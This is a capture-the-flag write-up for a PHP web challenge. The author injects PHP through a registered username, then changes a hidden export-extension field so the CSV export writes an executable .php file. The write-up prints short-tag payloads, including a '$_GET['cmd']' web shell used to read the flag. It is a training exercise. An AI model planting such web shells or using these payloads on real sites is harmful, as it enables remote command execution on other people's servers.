# Challenge:

Black Pink in My Dinh

FLAG Format: EHC{XXX}

# Solution:

First when we come up with the website there only `login` and `register` can work. Try to register a simple account. Login and we got something like log

![image](https://github.com/Katsumi1012/CTF/assets/90083485/82ca49b3-30ff-4dd8-9e1f-7801db4a14b6)

A button say `Export to CSV`. Click and we have a notification say

![image](https://github.com/Katsumi1012/CTF/assets/90083485/d93281e4-787c-40ed-ad5a-38f545db0e56)

Go to `file/45748278064a7c3ab066882.26555608.csv` and we got somthing like output of a excel file.

![image](https://github.com/Katsumi1012/CTF/assets/90083485/b157df8d-46a0-4689-b725-eb450e61c196)

First, I try to CSV injection but non of them work. Notice the challenge name is about php, finding again and we find a `hidden` in source code

![image](https://github.com/Katsumi1012/CTF/assets/90083485/2a8ff677-268c-4293-b7bb-2eebf15678d9)

The `value` have a string end with `.csv` in the end. Let's try to change it to php and export again if they work?

![image](https://github.com/Katsumi1012/CTF/assets/90083485/d3347bee-5c7d-432f-9b5d-87d0c581d9e8)

They worked, i can control the file type now.

![image](https://github.com/Katsumi1012/CTF/assets/90083485/a7db7e7e-cea3-4c22-9462-f42910998024)

The only input we got is the `username`. Try to register a username like this: `<?php phpinfo(); ?>` and we can LMAO 😃. Login again and we see this

![image](https://github.com/Katsumi1012/CTF/assets/90083485/f21b2f47-3d92-40d1-82c4-c720e47ffc02)

I notice the `#` after the `<?php` look like it has been filter, i predict that won't work when export to php file and i'm, right

![image](https://github.com/Katsumi1012/CTF/assets/90083485/a5df8ca8-a73b-4753-896f-413efd7bca81)

Search google is there anyway to start the php code without using `<?php`. And i got a result

![image](https://github.com/Katsumi1012/CTF/assets/90083485/9786a720-9969-4b5c-a504-9c3a4a1d13b6)

So let change the payload to this: `<?= phpinfo() ?>` and woala 👏

![image](https://github.com/Katsumi1012/CTF/assets/90083485/f6b39a5e-0b98-495c-bde7-c8782ce19998)

We got the right way. Try payload `<?= system("ls -la"); ?>`

![image](https://github.com/Katsumi1012/CTF/assets/90083485/712188e0-f054-461f-84aa-2e7a9bb9955d)

Oh no. We got some error here. it's look like some how, they treat `ls` to a variable❓ Maybe the error from `"` because the server echo something out and the `"` get enter close the echo and we get error at `ls`. This time try `<?= system('ls -la'); ?>` and we get result

![image](https://github.com/Katsumi1012/CTF/assets/90083485/e4da5632-7929-4d65-855c-ecbaf62d314d)

We know all the trick around here. So this time i use this `<?= system($_GET['cmd']);?>` to not register over and over.

![image](https://github.com/Katsumi1012/CTF/assets/90083485/00d10a17-e284-4871-ab0f-f797729a9603)

And i found the `flag.txt` file 😙

![image](https://github.com/Katsumi1012/CTF/assets/90083485/50f680ff-e8fb-4ef8-8be5-5f07aa168e8d)

Cat the flag🚩

![1st](https://github.com/Katsumi1012/CTF/assets/90083485/510aa687-d9a6-4df3-9964-aada67a87c56)

# ENJOY🤡
